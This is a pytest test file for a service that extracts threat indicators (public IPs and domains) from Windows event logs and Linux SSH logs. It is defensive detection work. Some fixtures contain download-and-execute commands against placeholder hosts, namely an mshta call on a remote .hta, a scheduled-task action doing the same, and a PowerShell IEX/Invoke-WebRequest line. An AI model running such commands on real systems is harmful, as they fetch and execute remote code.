from copy import deepcopy

import pytest

from app.services.ti_indicator_service import (
    ThreatIndicator,
    extract_indicators_from_event,
    normalize_domain,
    normalize_public_ip,
)


def windows_event(event_id, inserts):
    return {
        "source": "windows_eventlog",
        "raw_event": {
            "EventID": event_id,
            "Channel": "Security",
            "ProviderName": "Microsoft-Windows-Security-Auditing",
            "StringInserts": inserts,
        },
    }


def test_normalize_public_ip_accepts_only_global_addresses():
    assert normalize_public_ip("8.8.8.8") == "8.8.8.8"
    assert normalize_public_ip("2001:4860:4860::8888") == "2001:4860:4860::8888"

    for value in (
        "127.0.0.1",
        "10.0.0.8",
        "192.168.1.10",
        "169.254.1.2",
        "192.0.2.10",
        "198.51.100.10",
        "203.0.113.10",
        "::1",
        "fe80::1",
        "",
        "-",
        "not-an-ip",
    ):
        assert normalize_public_ip(value) is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("Example.COM.", "example.com"),
        ("sub.example.org", "sub.example.org"),
        ("localhost", None),
        ("host.local", None),
        ("10.0.0.1", None),
        ("-bad.example", None),
        ("bad-.example", None),
        ("example", None),
        ("", None),
    ],
)
def test_normalize_domain_is_conservative(value, expected):
    assert normalize_domain(value) == expected


def test_windows_4625_extracts_only_public_evidence_ip():
    inserts = [""] * 21
    inserts[19] = "8.8.8.8"

    event = windows_event(4625, inserts)
    snapshot = deepcopy(event)

    assert extract_indicators_from_event(event) == (
        ThreatIndicator("ip", "8.8.8.8"),
    )
    assert event == snapshot

    inserts[19] = "192.168.1.50"
    assert extract_indicators_from_event(windows_event(4625, inserts)) == ()


def test_windows_4624_and_4648_extract_documented_source_fields():
    logon = [""] * 19
    logon[18] = "1.1.1.1"

    explicit = [""] * 14
    explicit[12] = "9.9.9.9"

    assert extract_indicators_from_event(windows_event(4624, logon)) == (
        ThreatIndicator("ip", "1.1.1.1"),
    )
    assert extract_indicators_from_event(windows_event(4648, explicit)) == (
        ThreatIndicator("ip", "9.9.9.9"),
    )


def test_linux_source_ip_must_be_present_in_raw_evidence_and_public():
    event = {
        "source": "linux_journald",
        "raw_event": {
            "_SYSTEMD_UNIT": "ssh.service",
            "MESSAGE": "Failed password for admin from 8.8.4.4 port 22 ssh2",
        },
    }

    assert extract_indicators_from_event(event) == (
        ThreatIndicator("ip", "8.8.4.4"),
    )

    event["raw_event"]["MESSAGE"] = (
        "Failed password for admin from 10.0.0.5 port 22 ssh2"
    )
    assert extract_indicators_from_event(event) == ()


def test_4688_domain_only_from_url_in_command_line():
    inserts = [""] * 9
    inserts[8] = "mshta https://payload.example.com/file.hta"

    assert extract_indicators_from_event(windows_event(4688, inserts)) == (
        ThreatIndicator("domain", "payload.example.com"),
    )

    inserts[8] = "cmd /c ping payload.example.com"
    assert extract_indicators_from_event(windows_event(4688, inserts)) == ()


def test_task_domain_only_from_direct_exec_action():
    xml = (
        '<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
        "<RegistrationInfo>"
        "<Description>https://metadata.example.com/x</Description>"
        "</RegistrationInfo>"
        "<Actions><Exec><Command>mshta.exe</Command>"
        "<Arguments>https://task.example.net/a.hta</Arguments>"
        "</Exec></Actions></Task>"
    )
    inserts = ["a", "b", "c", "d", "\\Task", xml]

    assert extract_indicators_from_event(windows_event(4698, inserts)) == (
        ThreatIndicator("domain", "task.example.net"),
    )


def test_powershell_4104_extracts_url_domain_from_script_evidence():
    event = {
        "source": "windows_eventlog",
        "raw_event": {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "ProviderName": "Microsoft-Windows-PowerShell",
            "StringInserts": [
                "1",
                "1",
                "IEX (Invoke-WebRequest https://ps.example.org/a).Content",
                "block-a",
                "",
            ],
        },
    }

    assert extract_indicators_from_event(event) == (
        ThreatIndicator("domain", "ps.example.org"),
    )


def test_untrusted_provider_and_freeform_message_are_not_scanned():
    event = {
        "source": "windows_eventlog",
        "message": "Visit https://message.example.com now",
        "raw_event": {
            "EventID": 4688,
            "Channel": "Security",
            "ProviderName": "Fake-Provider",
            "StringInserts": [""] * 9,
        },
    }

    assert extract_indicators_from_event(event) == ()
